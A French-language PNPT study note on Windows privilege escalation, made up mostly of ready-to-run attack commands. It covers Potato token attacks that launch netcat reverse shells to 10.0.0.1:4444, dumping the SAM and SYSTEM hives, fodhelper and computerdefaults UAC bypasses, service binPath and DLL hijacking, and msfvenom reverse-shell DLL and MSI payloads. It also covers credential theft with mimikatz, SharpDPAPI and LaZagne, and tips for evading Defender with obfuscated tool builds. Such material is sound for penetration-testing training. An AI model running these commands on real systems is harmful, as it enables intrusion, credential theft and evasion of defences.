---
title: "Privilege Escalation - Windows (PNPT)"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > PNPT"
tags: [sciences-appliquées, informatique, sécurité, privesc, windows, pnpt]
date: "2026-05-18"
---

# Privilege Escalation — Windows

Le privesc Windows est plus structuré que le Linux : moins de "misconfigs aléatoires", plus de vecteurs identifiés et catalogués. La clé : `whoami /priv`. Cette commande résume tes super-pouvoirs latents — et si tu en as un, il y a presque toujours un chemin direct vers SYSTEM.

## Arbre de décision

```
   Shell utilisateur Windows obtenu
                │
                ▼
   ┌──────────────────────────┐
   │ 1. whoami /priv          │ → SeImpersonate / SeBackup / SeDebug ?
   └─────────────┬────────────┘
                 ▼
   ┌──────────────────────────┐
   │ 2. whoami /groups        │ → Admin local en medium integrity ? UAC bypass
   └─────────────┬────────────┘
                 ▼
   ┌──────────────────────────┐
   │ 3. Services mal config   │ → binPath writable, unquoted path, DLL hijack
   └─────────────┬────────────┘
                 ▼
   ┌──────────────────────────┐
   │ 4. AlwaysInstallElevated │ → MSI en SYSTEM si activé
   └─────────────┬────────────┘
                 ▼
   ┌──────────────────────────┐
   │ 5. Credentials stockées  │ → cmdkey, DPAPI, registry, unattend
   └─────────────┬────────────┘
                 ▼
   ┌──────────────────────────┐
   │ 6. Tâches planifiées     │ → scripts SYSTEM modifiables
   └─────────────┬────────────┘
                 ▼
   ┌──────────────────────────┐
   │ 7. Kernel exploit        │ → dernier recours
   └──────────────────────────┘
```

## Énumération automatique

```powershell
# WinPEAS — équivalent LinPEAS pour Windows
winpeas.exe -log
winpeas.exe quiet                # silencieux, pour environnements monitoring

# PowerUp — focus services et configs
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt — énumération exhaustive
Seatbelt.exe -group=all
Seatbelt.exe -group=user          # juste l'utilisateur courant
```

WinPEAS code en couleur les vecteurs probables. PowerUp est rapide pour les services. Seatbelt couvre des points oubliés (browser history, RDP, WiFi).

## Privilèges du token — la première chose à regarder

```powershell
whoami /priv
```

Si tu vois un de ces privilèges en "Enabled", c'est une privesc directe :

| Privilege               | Exploitation                                              |
|-------------------------|-----------------------------------------------------------|
| SeImpersonatePrivilege  | PrintSpoofer / GodPotato / JuicyPotatoNG (Potato attacks) |
| SeAssignPrimaryToken    | Variante Potato (token kidnapping)                        |
| SeBackupPrivilege       | Lire SAM/SYSTEM/SECURITY même si DACL refuse              |
| SeRestorePrivilege      | Écrire dans HKLM, modifier des services                   |
| SeTakeOwnership         | Prendre la propriété d'un objet, puis ACL                 |
| SeDebugPrivilege        | Injecter dans un processus SYSTEM                         |
| SeLoadDriverPrivilege   | Charger un driver vulnérable (BYOVD)                      |
| SeManageVolume          | Lecture totale du FS via mounting tricks                  |
| SeTcb                   | Game over (Trusted Computing Base)                        |

### SeImpersonate — les Potato attacks

```
Principe :
  Tout service Windows tournant en SYSTEM peut être leurré pour s'authentifier
  vers une ressource locale. Si on intercepte cette authentification (relay
  NTLM local), on récupère un token SYSTEM, qu'on impersonne.

  → PrintSpoofer/GodPotato/JuicyPotatoNG sont des variantes du même concept.
```

```powershell
# PrintSpoofer (Server 2016/2019, Windows 10)
PrintSpoofer.exe -c "cmd /c whoami"
PrintSpoofer.exe -i -c powershell.exe

# GodPotato (Server 2012+, Windows 10/11 — la plus universelle aujourd'hui)
GodPotato.exe -cmd "cmd /c reverse_shell.exe"

# JuicyPotatoNG (Server 2016/2019/2022)
JuicyPotatoNG.exe -t * -p "C:\Temp\nc.exe" -a "10.0.0.1 4444 -e cmd"
```

### SeBackupPrivilege

```powershell
# Dump SAM/SYSTEM même avec access denied normal
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# Variante avec robocopy
robocopy /B C:\Windows\System32\config\ C:\Temp\ SAM SYSTEM

# Puis sur Kali, dump des hashes
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

## UAC Bypass

Si on est dans le groupe Administrators mais avec un token Medium Integrity (cas du UAC standard), on contourne UAC pour obtenir un token High Integrity sans prompt.

```powershell
# Vérifier le niveau d'intégrité actuel
whoami /groups | findstr -i "Mandatory Label"
# S-1-16-12288 = High (déjà admin élevé)
# S-1-16-8192  = Medium (cible du UAC bypass)
# S-1-16-4096  = Low

# Vérifier la politique UAC
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0 = no prompt (UAC désactivé)
# 2 = prompt always (UAC strict)
# 5 = prompt for non-Windows binaries (défaut)
```

```powershell
# Bypass via fodhelper (auto-elevate sans prompt)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell.exe -nop -w hidden -c <payload>"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Start-Process "C:\Windows\System32\fodhelper.exe"

# Bypass via computerdefaults
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c <payload>"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Start-Process "C:\Windows\System32\computerdefaults.exe"

# Outils : UACME — 40+ techniques cataloguées
Akagi64.exe 23 C:\Temp\reverse.exe
```

**Pourquoi ces binaires précis** : `fodhelper.exe` et `computerdefaults.exe` sont auto-elevate sans prompt. Ils consultent `HKCU\...\ms-settings\Shell\Open\command` au démarrage → on y injecte notre commande, qui s'exécute en High Integrity.

## Services mal configurés

Trois angles : modifier le binaire pointé, modifier le chemin, ou exploiter un chemin non quoté.

### binPath modifiable

```powershell
# Lister
sc query state= all
wmic service get name,displayname,pathname,startmode

# Vérifier les permissions d'un service spécifique
accesschk.exe /accepteula -ucqv SERVICE_NAME

# Si on peut modifier le binPath :
sc config SERVICE_NAME binpath= "C:\Temp\reverse.exe"
sc stop SERVICE_NAME
sc start SERVICE_NAME
```

### Unquoted Service Paths

Si le `binPath` d'un service contient des espaces et n'est pas entre guillemets, Windows tente plusieurs chemins en cascade.

```
binPath = C:\Program Files\My App\service.exe   ← pas de guillemets !

Windows essaie successivement :
  1. C:\Program.exe                    ← si on peut y écrire, on a gagné
  2. C:\Program Files\My.exe           ← idem
  3. C:\Program Files\My App\service.exe   ← original
```

```powershell
# Trouver des unquoted paths
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """

# Vérifier les droits d'écriture sur les chemins suspects
icacls "C:\Program Files"
icacls "C:\Program Files\My App"
```

### DLL Hijacking

Si un service charge une DLL via un chemin relatif ou cherche dans un dossier writable :

```powershell
# Procmon (sysinternals) — détecter les "NAME NOT FOUND" en *.dll
# = service cherche une DLL qui n'existe pas, à placer dans un dossier qu'il consulte

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o hijack.dll
copy hijack.dll C:\dir-writable-du-service\
```

## AlwaysInstallElevated

Politique qui exécute tous les MSI en SYSTEM, peu importe l'utilisateur. Si activée, c'est une privesc en une commande.

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Les DEUX à 0x1 ? Privesc immédiate :
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

## Credentials stockées

```powershell
# Credentials Windows (cmdkey)
cmdkey /list
runas /savecred /user:admin cmd.exe      # utilise un cred stocké

# Recherche dans le registre
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Recherche dans les fichiers
findstr /si password *.txt *.ini *.config *.xml

# WiFi (en clair !)
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# Unattend.xml (déploiements automatisés)
findstr /si "password" C:\Windows\Panther\unattend*.xml
findstr /si "password" C:\Windows\System32\sysprep\unattend*.xml
findstr /si "password" C:\unattend.xml
```

## DPAPI — credentials chiffrés par Windows

DPAPI (Data Protection API) chiffre les credentials stockés par Chrome, Firefox, RDP, Outlook, WiFi, etc. Avec les Master Keys du user (extraites de l'AppData), on peut tout déchiffrer.

```powershell
# Lister les Master Keys
dir /a "%APPDATA%\Microsoft\Protect\<SID>\"

# Mimikatz — tout extraire
mimikatz # dpapi::masterkey /in:"<path>" /rpc
mimikatz # dpapi::cred /in:"<path>"
mimikatz # vault::cred /patch
mimikatz # vault::list

# SharpDPAPI — alternative offensive standalone
SharpDPAPI.exe credentials
SharpDPAPI.exe vaults
SharpDPAPI.exe rdg                        # fichiers RDP
SharpDPAPI.exe blob /target:C:\path\file
```

## Credentials des navigateurs

```powershell
# LaZagne — multi-app multi-browser, magique
LaZagne.exe all

# SharpChromium — focus navigateurs
SharpChromium.exe all
SharpWeb.exe all

# Mimikatz pour Chrome
mimikatz # dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

## Apps qui stockent en clair

```powershell
# KeePass — base + clé si fichier .key présent
findstr /si "kdbx" *.* 2>nul

# Putty — sessions sauvegardées (parfois mots de passe)
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# FileZilla — sitemanager.xml en clair !
type "%APPDATA%\FileZilla\sitemanager.xml"

# Notepad++ — sessions récentes (chemins de fichiers ouverts)
type "%APPDATA%\Notepad++\session.xml"
```

## Tâches planifiées et Autorun

```powershell
# Tâches planifiées
schtasks /query /fo LIST /v
# Chercher : "Run As User: SYSTEM" + script writable

# Autorun (HKCU et HKLM)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Si un chemin pointé est modifiable, remplacer par un payload
```

## BYOVD — Bring Your Own Vulnerable Driver

Si `SeLoadDriverPrivilege` est dispo, on peut charger un driver signé mais vulnérable, puis exploiter une CVE kernel via ce driver. Plus rare en PNPT, courant en red team réel.

Référence : loldrivers.io — catalogue de drivers vulnérables signés.

## Pièges courants

- **`whoami /priv` montre les privilèges "désactivés"** : un privilège listé n'est pas forcément actif. `SeImpersonate` Disabled = inutile en l'état. Mais souvent il suffit de l'activer en code.
- **Potato attacks ne marchent plus partout** : JuicyPotato (original) ne marche pas sur Server 2019+. Utiliser PrintSpoofer/GodPotato selon la version. GodPotato est le plus universel aujourd'hui.
- **AccessChk demande EULA** : `accesschk.exe /accepteula` au premier lancement. Sinon il bloque.
- **Defender détecte tous les outils standards** : winPEAS, mimikatz, SharpDPAPI sont signés rouge. Versions obfusquées disponibles (winPEAS-ofs), ou compiler depuis sources avec strings modifiées.
- **`runas /savecred` nécessite que le cred soit déjà stocké par l'utilisateur** : sinon on a juste un prompt mot de passe.
- **WiFi en clair** marche aussi sans admin → check rapide en early enum.
- **UAC bypass via registre peut être journalisé** par les EDR modernes : Defender ATP, CrowdStrike détectent les modifs `ms-settings` suspectes. UACME a des techniques plus furtives.
- **Le bit High Integrity ne suffit pas pour DCSync** : il faut être Domain Admin (ou avoir l'ACL spécifique). High Integrity local ≠ Domain Admin.
